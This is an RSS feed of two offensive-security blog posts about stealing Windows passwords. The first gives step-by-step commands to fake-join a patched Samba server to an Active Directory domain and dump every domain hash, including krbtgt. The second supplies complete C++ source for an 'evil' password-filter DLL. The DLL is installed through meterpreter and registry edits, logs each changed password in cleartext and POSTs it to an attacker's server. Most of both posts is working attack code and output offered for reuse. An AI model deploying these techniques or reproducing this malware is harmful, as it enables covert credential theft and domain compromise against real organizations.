<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>passwords on malicious.link</title>
    <link>/categories/passwords/</link>
    <description>Recent content in passwords on malicious.link</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Wed, 14 May 2014 23:18:45 -0400</lastBuildDate>
    
        <atom:link href="/categories/passwords/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Dumping NTDS.dit domain hashes using Samba</title>
      <link>/post/2014/2014-05-14-dumping-ntds-dot-dit-domain-hashes-using-samba/</link>
      <pubDate>Wed, 14 May 2014 23:18:45 -0400</pubDate>
      
      <guid>/post/2014/2014-05-14-dumping-ntds-dot-dit-domain-hashes-using-samba/</guid>
      <description>&lt;p&gt;So there was this blog post that talking about a number of ways to dump windows credentials by &lt;a href=&#34;https://twitter.com/lanjelot&#34;&gt;@lanjelot&lt;/a&gt; [definitly someone to follow] - here: &lt;a href=&#34;https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/&#34;&gt;https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/&lt;/a&gt; and at the very bottom of this post it says &amp;ldquo;&lt;strong&gt;AD Replication (EXPERIMENTAL)&lt;/strong&gt;&amp;ldquo;&lt;/p&gt;

&lt;p&gt;What it boils down to is if you can position a system that can do DNS resolution to the target domain, and perform some other UDP traffic, you can fake join a samba server you control to a domain and it &lt;strong&gt;&lt;em&gt;doesn&amp;rsquo;t require code execution in any way on the domain controller&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Notice: I am not doing this on a Kali Linux box, there is already an install of Samba there and I didn&amp;rsquo;t want to try uninstalling or modifying the one installed.&lt;/p&gt;

&lt;p&gt;First, you need this patch:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;wget http://files.securusglobal.com/samba-4.1.0_replication-only-patch.txt&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;and Samba 4.1.0&lt;/p&gt;

&lt;p&gt;&lt;code&gt;wget http://ftp.samba.org/pub/samba/stable/samba-4.1.0.tar.gz&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;You will probably also require some dependencies to be installed:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;apt-get install python2.7-dev python-samba libacl1-dev build-essential libldap2-dev libkrb5-dev attr&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Since the patch is kinda wonky, you need to make a &lt;code&gt;src&lt;/code&gt; directory and extract samba into there first. Then apply the patch in whatever directory is above src&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mkdir src
mv samba-4.1.0.tar.gz src/
cd src/
tar zxvf samba-4.1.0.tar.gz
cd /root/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So it would look like this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;samba-4.1.0_replication-only-patch.txt
src/
src/samba-4.1.0/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;then run &lt;code&gt;patch -p0 &amp;lt; samba-4.1.0_replication-only-patch.txt&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;cd ./src/samba-4.1.0/
./configure
make
make install
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Prepare the box:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;rm -rf /var/lib/samba; mkdir /var/lib/samba; rm -f /etc/samba/smb.conf
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next you need to make sure you are resolving correctly (if you can&amp;rsquo;t resolve the SRV record &lt;code&gt;_ldap._tcp.sittingduck.info&lt;/code&gt; (sittingduck.info being the domain) then this isn&amp;rsquo;t going to work.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;echo nameserver 192.168.92.37 &amp;gt; /etc/resolv.conf # this is the IP address of the DC
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then start the clone:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;/usr/local/samba/bin/samba-tool domain join sittingduck.info DC -U sittingduck\\administrator
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Looks like this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@sambabox:~/src/samba-4.1.0# /usr/local/samba/bin/samba-tool domain join sittingduck.info DC -U sittingduck\\administrator
Finding a writeable DC for domain &#39;sittingduck.info&#39;
Found DC 2K8DC.sittingduck.info
Password for [SITTINGDUCK\administrator]:
workgroup is SITTINGDUCK
realm is sittingduck.info
Calling bare provision
No IPv6 address will be assigned
Provision OK for domain DN DC=sittingduck,DC=info
Starting replication
Schema-DN[CN=Schema,CN=Configuration,DC=sittingduck,DC=info] objects[402] linked_values[0]
Schema-DN[CN=Schema,CN=Configuration,DC=sittingduck,DC=info] objects[804] linked_values[0]
Schema-DN[CN=Schema,CN=Configuration,DC=sittingduck,DC=info] objects[1206] linked_values[0]
Schema-DN[CN=Schema,CN=Configuration,DC=sittingduck,DC=info] objects[1521] linked_values[0]
Analyze and apply schema objects
Partition[CN=Configuration,DC=sittingduck,DC=info] objects[402] linked_values[0]
Partition[CN=Configuration,DC=sittingduck,DC=info] objects[804] linked_values[0]
Partition[CN=Configuration,DC=sittingduck,DC=info] objects[1206] linked_values[0]
Partition[CN=Configuration,DC=sittingduck,DC=info] objects[1608] linked_values[1]
Partition[CN=Configuration,DC=sittingduck,DC=info] objects[1614] linked_values[11]
Replicating critical objects from the base DN of the domain
Partition[DC=sittingduck,DC=info] objects[100] linked_values[24]
Partition[DC=sittingduck,DC=info] objects[353] linked_values[27]
Done with always replicated NC (base, config, schema)
Committing SAM database
descriptor_sd_propagation_recursive: DC=DomainDnsZones,DC=sittingduck,DC=info not found under DC=sittingduck,DC=info
descriptor_sd_propagation_recursive: DC=ForestDnsZones,DC=sittingduck,DC=info not found under DC=sittingduck,DC=info
Joined domain SITTINGDUCK (SID S-1-5-21-3147519476-3247671789-820278723) as a DC

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then to get the hashes:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@sambabox:~# /usr/local/samba/bin/pdbedit -L -w
2K8DC$:4294967295:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:CB14F1166BBE1749AC0FB40240C5DC30:[S          ]:LCT-530FC425:
Administrator:4294967295:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:88E4D9FABAECF3DEC18DD80905521B29:[U          ]:LCT-531006A4:
krbtgt:4294967295:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:F2EE6AB6F40810169E0E46B126CEFBEF:[DU         ]:LCT-530FC3FF:
nobody:65534:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:[U          ]:LCT-00000000:
jdoe:4294967295:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:88E4D9FABAECF3DEC18DD80905521B29:[UX         ]:LCT-530FC5FF:
uber:4294967295:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:88E4D9FABAECF3DEC18DD80905521B29:[UX         ]:LCT-53101261:

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Or you can do it with history:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@sambabox:~# python samba-pwdump.py /usr/local/samba/private/sam.ldb.d/DC\=SITTINGDUCK\,DC\=INFO.ldb -history
SAMBACLONE$:1104:::::
2K8DC$:1000::cb14f1166bbe1749ac0fb40240c5dc30:::
Administrator:500::88e4d9fabaecf3dec18dd80905521b29:::
krbtgt:502::f2ee6ab6f40810169e0e46b126cefbef:::
Guest:501:::::
jdoe:1103::88e4d9fabaecf3dec18dd80905521b29:::
uber:1105::88e4d9fabaecf3dec18dd80905521b29:::
uber_history0:1105:444d1edcad01ae08f49f073e12e8cc14:88e4d9fabaecf3dec18dd80905521b29:::
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Game over. The great thing is that it never actually shows up as a joined box in the domain, and as far as I can tell the only log on the real DC is the login success of a domain admin. Plus one of the huge benefits to this method is that once you have the database Samba makes it really easy to query information like group membership or users info after the fact, not just hashes.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Stealing passwords every time they change</title>
      <link>/post/2013/2013-09-11-stealing-passwords-every-time-they-change/</link>
      <pubDate>Wed, 11 Sep 2013 00:28:31 -0500</pubDate>
      
      <guid>/post/2013/2013-09-11-stealing-passwords-every-time-they-change/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;&amp;quot;http://msdn.microsoft.com/en-us/library/windows/desktop/ms721882(v=vs.85&#34;&gt;Password Filters [0]&lt;/a&gt;.aspx&amp;rdquo;) are a way for organizations and governments to enforce stricter password requirements on Windows Accounts than those available by default in Active Directory Group Policy.  It is also fairly documented on how to Install and &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/ms721766(v=vs.85).aspx&#34;&gt;Register Password Filters [1]&lt;/a&gt;. Basically what it boils down to is updating a registry key here: &lt;code&gt;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;with the name of a DLL (without the extension) that you place in Windows\System32&lt;/p&gt;

&lt;p&gt;For &lt;a href=&#34;http://www.nationalccdc.org/&#34;&gt;National CCDC&lt;/a&gt; earlier this year (2013), I created an installer and &amp;ldquo;evil pass filter&amp;rdquo; that basically installed itself as a password filter and any time any passwords changed it would store the change to a log file locally to the victim (in clear text) as well as issue an HTTP basic auth POST to a server I own with the username and password.&lt;/p&gt;

&lt;p&gt;The full code can be found below. I&amp;rsquo;ll leave the compiling up to you but basically its slamming the code in Visual Studio, telling it its a DLL, and clicking build for the architecture you are targeting (Make sure to use the Internet Open access settings that make the most sense for the environment you are using this in [&lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/aa385096(v=vs.85).aspx&#34;&gt;2&lt;/a&gt;].&lt;/p&gt;

&lt;p&gt;So lets walk the exploitation:&lt;/p&gt;

&lt;p&gt;First, you have to be admin or system, as this is more of a persistence method than anything.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; getuid
Server username: NT AUTHORITY\SYSTEM
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next, we upload the evilpassfilter.dll to Sytem32:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; pwd
C:\Windows\system32
meterpreter &amp;gt; upload /tmp/evilpassfilter.dll .
[*] uploading  : /tmp/evilpassfilter.dll -&amp;gt; .
[*] uploaded   : /tmp/evilpassfilter.dll -&amp;gt; .\evilpassfilter.dll
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then we need to query what is already in the notification packages list:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; reg queryval -k HKLM\\System\\CurrentControlSet\\Control\\Lsa -v &amp;quot;Notification Packages&amp;quot;
Key: HKLM\System\CurrentcontrolSet\Control\Lsa
Name: Notification Packages
Type:
Data: sceclirassfm
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;What you can&amp;rsquo;t see here since Metasploit isn&amp;rsquo;t showing the line breaks is that there are two there by default:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;scecli
rassfm
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We need to add ours to the end of this list, unfortunately at the current point of time its impossible to do directly from the meterpreter command line (as far as I know). So we need to drop a .reg file and manually import it. Easiest way to do that is to add your &amp;ldquo;evilpassfilter&amp;rdquo; string as well as the ones on the victim to a VM you have and export it. Should look like this:&lt;/p&gt;

&lt;p&gt;Once we have our file, we upload and import it using reg command:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; upload importme.reg .
[*] uploading  : importme.reg -&amp;gt; .
[*] uploaded   : importme.reg -&amp;gt; .\importme.reg
meterpreter &amp;gt; execute -H -f regedit.exe -a &#39;/s importme.reg&#39;
Process 2628 created.
meterpreter &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Double check our work:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; reg queryval -k HKLM\\System\\CurrentcontrolSet\\Control\\Lsa -v &amp;quot;Notification Packages&amp;quot;
Key: HKLM\System\CurrentcontrolSet\Control\Lsa
Name: Notification Packages
Type:
Data: sceclirnrassfmrnevilpassfilter 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Its there, w00t! But it doesn&amp;rsquo;t do anything until a reboot happens :(. Lets just force that to happen (not the most stealthy thing to do):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; reboot
Rebooting...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;While thats going on, lets set up the server to catch the basic auth.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf exploit(psexec) &amp;gt; use auxiliary/server/capture/http_basic
msf auxiliary(http_basic) &amp;gt; set URIPATH /
URIPATH =&amp;gt; /
msf auxiliary(http_basic) &amp;gt; run
[*] Auxiliary module execution completed
msf auxiliary(http_basic) &amp;gt;
[*] Listening on 0.0.0.0:80...
[*] Using URL: http://0.0.0.0:80/
[*]  Local IP: http://192.168.92.106:80/
[*] Server started.
msf auxiliary(http_basic) &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then we wait for a password to be changed:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf auxiliary(http_basic) &amp;gt;
[*] 192.168.92.106   http_basic - Sending 401 to client
[+] 192.168.92.106 - Credential collected: &amp;quot;jack:ASDqwe123&amp;quot; =&amp;gt; /
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;No matter how complex their password is and without having a shell on the box anymore:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf auxiliary(http_basic) &amp;gt;
[+] 192.168.92.106 - Credential collected: &amp;quot;jack:a?&#39;z_a4#RRK(mvQEsyQ8l`,JR.pes&amp;lt;;6#0$puQ%Q&amp;amp;,@ZwY(T@p&amp;quot; =&amp;gt; /
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This works from Windows 2000, XP all the way up to Windows 8 &amp;amp; 2012.&lt;/p&gt;

&lt;p&gt;Ok, but how often are local password changed? Maybe not that often, but guess what happens when a password filter is put on a domain controller. Every password changed by that DC is &amp;ldquo;verified&amp;rdquo; by your evil password filter.&lt;/p&gt;

&lt;p&gt;Oh and what does that log file we talked about earlier on the victim look like if for some reason they block that IP you&amp;rsquo;re getting your authentication to? (You would have to find a way to get back on that system, or make it available via a share or otherwise)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;InitializeChangeNotify()
JackJohnson:ASDqwe123
JackJohnson:a?&#39;z_a4#RRK(mvQEsyQ8l`,JR.pes&amp;lt;;6#0$puQ%Q&amp;amp;,@ZwY(T@p
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This attack supports a larger character set than most banks ;-)&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;[0] &lt;a href=&#34;&amp;quot;http://msdn.microsoft.com/en-us/library/windows/desktop/ms721882(v=vs.85&#34;&gt;http://msdn.microsoft.com/en-us/library/windows/desktop/ms721882(v=vs.85).aspx&lt;/a&gt;.aspx&amp;rdquo;)&lt;/li&gt;
&lt;li&gt;[1] &lt;a href=&#34;&amp;quot;http://msdn.microsoft.com/en-us/library/windows/desktop/ms721766(v=vs.85&#34;&gt;http://msdn.microsoft.com/en-us/library/windows/desktop/ms721766(v=vs.85).aspx&lt;/a&gt;.aspx&amp;rdquo;)&lt;/li&gt;
&lt;li&gt;[2] &lt;a href=&#34;&amp;quot;http://msdn.microsoft.com/en-us/library/windows/desktop/aa385096(v=vs.85&#34;&gt;http://msdn.microsoft.com/en-us/library/windows/desktop/aa385096(v=vs.85).aspx&lt;/a&gt;.aspx&amp;rdquo;)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Full code:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#include &amp;lt;windows.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;WinInet.h&amp;gt;
#include &amp;lt;ntsecapi.h&amp;gt;

void writeToLog(const char* szString)
{
    FILE* pFile = fopen(&amp;quot;c:\\windows\\temp\\logFile.txt&amp;quot;, &amp;quot;a+&amp;quot;);
    if (NULL == pFile)
    {
        return;
    }
    fprintf(pFile, &amp;quot;%s\r\n&amp;quot;, szString);
    fclose(pFile);
    return;
}



// Default DllMain implementation
BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
                     )
{
    OutputDebugString(L&amp;quot;DllMain&amp;quot;);
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

BOOLEAN __stdcall InitializeChangeNotify(void)
{
    OutputDebugString(L&amp;quot;InitializeChangeNotify&amp;quot;);
    writeToLog(&amp;quot;InitializeChangeNotify()&amp;quot;);
    return TRUE;
}

BOOLEAN __stdcall PasswordFilter(
    PUNICODE_STRING AccountName,
    PUNICODE_STRING FullName,
    PUNICODE_STRING Password,
    BOOLEAN SetOperation )
{
    OutputDebugString(L&amp;quot;PasswordFilter&amp;quot;);
    return TRUE;
}

NTSTATUS __stdcall PasswordChangeNotify(
    PUNICODE_STRING UserName,
    ULONG RelativeId,
    PUNICODE_STRING NewPassword )
{
  FILE* pFile = fopen(&amp;quot;c:\\windows\\temp\\logFile.txt&amp;quot;, &amp;quot;a+&amp;quot;);
  //HINTERNET hInternet = InternetOpen(L&amp;quot;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0&amp;quot;,INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0);
	HINTERNET hInternet = InternetOpen(L&amp;quot;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0&amp;quot;,INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,0);
	HINTERNET hSession = InternetConnect(hInternet,L&amp;quot;172.16.10.1&amp;quot;,80,NULL,NULL,INTERNET_SERVICE_HTTP ,0,0);
	HINTERNET hReq = HttpOpenRequest(hSession,L&amp;quot;POST&amp;quot;,L&amp;quot;/&amp;quot;,NULL,NULL,NULL,0,0);
	char* pBuf=&amp;quot;SomeData&amp;quot;;



	OutputDebugString(L&amp;quot;PasswordChangeNotify&amp;quot;);
	if (NULL == pFile)
    {
        return;
    }
	fprintf(pFile, &amp;quot;%ws:%ws\r\n&amp;quot;, UserName-&amp;gt;Buffer,NewPassword-&amp;gt;Buffer);
  fclose(pFile);
	InternetSetOption(hSession,INTERNET_OPTION_USERNAME,UserName-&amp;gt;Buffer,UserName-&amp;gt;Length/2);
	InternetSetOption(hSession,INTERNET_OPTION_PASSWORD,NewPassword-&amp;gt;Buffer,NewPassword-&amp;gt;Length/2);
	HttpSendRequest(hReq,NULL,0,pBuf,strlen(pBuf));

    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
  </channel>
</rss>
